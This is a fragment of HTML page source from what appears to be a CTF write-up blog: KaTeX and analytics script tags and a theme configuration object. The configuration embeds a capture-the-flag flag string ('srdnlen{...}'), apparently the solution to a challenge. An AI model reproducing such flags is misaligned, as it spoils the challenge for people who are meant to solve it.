src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"id-1":"srdnlen{you_found_the_:path_for_becoming_a_real_http3_enjoyer}","id-2":"mH4ck3r0n3","id-3":"mH4ck3r0n3"},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"RYTH4NIP8Z","algoliaIndex":"mh4ck3r0n3_github_io_ryth4nip8z_articles","algoliaSearchKey":"5288bb44022269be805c2b51c80976df","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":100,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"],"id-3":["id-3"]},"duration":-1,"speed":70}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-597RCC8B41', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-597RCC8B41" async></script></body>
+</html>
